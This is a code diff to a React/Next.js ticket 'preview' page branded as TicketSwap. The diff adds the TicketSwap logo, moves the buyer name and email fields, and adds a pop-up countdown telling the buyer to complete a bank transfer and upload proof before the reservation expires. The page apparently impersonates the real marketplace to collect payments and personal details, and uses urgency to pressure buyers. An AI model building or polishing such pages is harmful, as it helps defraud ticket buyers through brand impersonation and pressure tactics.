@@ -36,6 +36,7 @@ export default function PreviewPage({ params }: { params: { code: string } }) {
   const [msg, setMsg] = useState<string | null>(null);
   const [err, setErr] = useState<string | null>(null);
   const [showPaymentCompleted, setShowPaymentCompleted] = useState(false);
+  const [showReservedModal, setShowReservedModal] = useState(true);
   const [bankOpen, setBankOpen] = useState(false);
   const fileRef = useRef<HTMLInputElement>(null);
 
@@ -89,7 +90,7 @@ export default function PreviewPage({ params }: { params: { code: string } }) {
   if (!data) { setNotFound(true); } else { setTicket(data as Ticket); }
   } catch { setNotFound(true); } finally { setLoading(false); }
   };
-  useEffect(() => { load(); }, [code]);
+  useEffect(() => { setShowReservedModal(true); load(); }, [code]);
 
   useEffect(() => {
   if (uploadFile && uploadFile.type.startsWith("image/")) {
@@ -170,7 +171,7 @@ export default function PreviewPage({ params }: { params: { code: string } }) {
   <div className="min-h-screen bg-white">
   <header className="sticky top-0 bg-white border-b" style={{ borderColor: BORDER }}>
   <div className="mx-auto max-w-[960px] px-4 h-[56px] flex items-center justify-between">
-  <Link href="/" className="font-black text-[19px]" style={{ color: BLACK }}>ticketswap<span className="w-1.5 h-1.5 rounded-full inline-block ml-0.5" style={{ background: TEAL }} /></Link>
+  <Link href="/" className="flex items-center gap-1.5"><img src="/ticketswaplogo.png" alt="TicketSwap" className="h-7 w-auto object-contain" /><span className="font-black text-[19px]" style={{ color: "#000" }}>ticketswap</span></Link>
   </div>
   </header>
   <div className="mx-auto max-w-[720px] px-4 py-14 text-center">
@@ -191,7 +192,7 @@ export default function PreviewPage({ params }: { params: { code: string } }) {
   <header className="sticky top-0 z-40 bg-white/95 backdrop-blur border-b" style={{ borderColor: BORDER }}>
   <div className="mx-auto max-w-[960px] px-3 sm:px-4 h-[52px] sm:h-[60px] flex items-center justify-between gap-2">
   <div className="flex items-center gap-3">
-  <Link href="/" className="font-black text-[18px] sm:text-[20px] tracking-[-0.6px]" style={{ color: BLACK }}>ticketswap<span className="w-1.5 h-1.5 rounded-full inline-block ml-0.5" style={{ background: TEAL }} /></Link>
+  <Link href="/" className="flex items-center gap-1.5"><img src="/ticketswaplogo.png" alt="TicketSwap" className="h-6 sm:h-7 w-auto object-contain" /><span className="font-black text-[18px] sm:text-[20px] tracking-[-0.6px]" style={{ color: "#000" }}>ticketswap</span></Link>
   {timeLeft !== null && (
   <div className={`flex items-center gap-1.5 px-3 py-1 rounded-full text-[11px] font-black border transition-colors ${isExpired ? "bg-red-50 text-red-600 border-red-100" : "bg-purple-50 text-purple-600 border-purple-100"}`}>
   <svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
@@ -320,6 +321,21 @@ export default function PreviewPage({ params }: { params: { code: string } }) {
   Thank you for choosing TicketSwap. We appreciate your business and look forward to providing you with a seamless ticketing experience.
   </div>
   </div>
+  </div>
+  </div>
+
+  {/* Buyer details - between notice and bank info */}
+  <div className="mt-4 rounded-2xl border bg-white p-4 sm:p-5 shadow-[0_2px_16px_rgba(0,0,0,0.04)]" style={{ borderColor: BORDER }}>
+  <div className="text-[11px] font-black tracking-[0.7px] text-[#6B7280]">BUYER DETAILS</div>
+  <div className="mt-3 grid sm:grid-cols-2 gap-3">
+  <label className="grid gap-1.5 text-left">
+  <span className="text-[11px] font-bold text-[#374151]">Buyer name</span>
+  <input value={uploadName} onChange={e=> setUploadName(e.target.value)} placeholder="Full Name" autoComplete="name" className="h-[48px] border rounded-xl px-4 text-[14px] outline-none bg-[#F8FAFC] focus:bg-white focus:border-[#00C2A8]" style={{ borderColor: BORDER }} />
+  </label>
+  <label className="grid gap-1.5 text-left">
+  <span className="text-[11px] font-bold text-[#374151]">Buyer email</span>
+  <input value={uploadEmail} onChange={e=> setUploadEmail(e.target.value)} placeholder="you@gmail.com" inputMode="email" autoComplete="email" className="h-[48px] border rounded-xl px-4 text-[14px] outline-none bg-[#F8FAFC] focus:bg-white focus:border-[#00C2A8]" style={{ borderColor: BORDER }} />
+  </label>
   </div>
   </div>
 
@@ -504,16 +520,6 @@ export default function PreviewPage({ params }: { params: { code: string } }) {
   )}
   </div>
 
-  <label className="grid gap-1.5 text-left">
-  <span className="text-[11px] font-bold text-[#374151]">Buyer name</span>
-  <input value={uploadName} onChange={e=> setUploadName(e.target.value)} placeholder="Full Name" autoComplete="name" className="h-[48px] border rounded-xl px-4 text-[14px] outline-none bg-[#F8FAFC] focus:bg-white focus:border-[#00C2A8]" style={{ borderColor: BORDER }} />
-  </label>
-
-  <label className="grid gap-1.5 text-left">
-  <span className="text-[11px] font-bold text-[#374151]">Buyer email</span>
-  <input value={uploadEmail} onChange={e=> setUploadEmail(e.target.value)} placeholder="you@gmail.com" inputMode="email" autoComplete="email" className="h-[48px] border rounded-xl px-4 text-[14px] outline-none bg-[#F8FAFC] focus:bg-white focus:border-[#00C2A8]" style={{ borderColor: BORDER }} />
-  </label>
-
   <button onClick={doUpload} disabled={uploading || !uploadFile} className="h-[50px] rounded-full text-[15px] font-black text-white disabled:opacity-50 active:scale-[0.98] shadow-sm flex items-center justify-center gap-2" style={{ background: uploading || !uploadFile ? "#9CA3AF" : TEAL }}>
   {uploading ? <><span className="h-4 w-4 rounded-full border-2 border-white/40 border-t-white animate-spin" /> Uploading...</> : ticket.receipt_url ? "Replace receipt" : "Upload receipt"}
   </button>
@@ -526,6 +532,21 @@ export default function PreviewPage({ params }: { params: { code: string } }) {
   )}
   </div>
 
+
+  {showReservedModal ? (
+  <div className="fixed inset-0 z-50 grid place-items-center p-4 bg-black/50 backdrop-blur-sm" onClick={() => setShowReservedModal(false)}>
+  <div className="w-full max-w-[360px] rounded-[20px] bg-white p-6 sm:p-7 shadow-2xl text-center" onClick={e => e.stopPropagation()}>
+  <div className="mx-auto h-12 w-12 rounded-full grid place-items-center text-white" style={{ background: TEAL }}><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg></div>
+  <h3 className="mt-4 text-[18px] font-black tracking-[-0.3px]" style={{ color: BLACK }}>Ticket Reserved For</h3>
+  <div className={`mt-3 inline-flex items-center gap-1.5 px-4 py-2 rounded-full text-[15px] font-black border ${isExpired ? "bg-red-50 text-red-600 border-red-100" : "bg-purple-50 text-purple-600 border-purple-100"}`}>
+  <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+  {timeLeft !== null ? (isExpired ? "EXPIRED" : formatTime(timeLeft)) : "--:--"}
+  </div>
+  <p className="mt-3 text-[12px] leading-relaxed text-[#6B7280]">Complete your transfer and upload proof before the timer ends.</p>
+  <button onClick={() => setShowReservedModal(false)} className="mt-5 w-full h-[44px] rounded-full text-sm font-black text-white active:scale-[0.98]" style={{ background: TEAL }}>Continue</button>
+  </div>
+  </div>
+  ) : null}
 
   {showPaymentCompleted ? (
   <div className="fixed inset-0 z-50 grid place-items-center p-4 bg-black/50 backdrop-blur-sm" onClick={() => setShowPaymentCompleted(false)}>
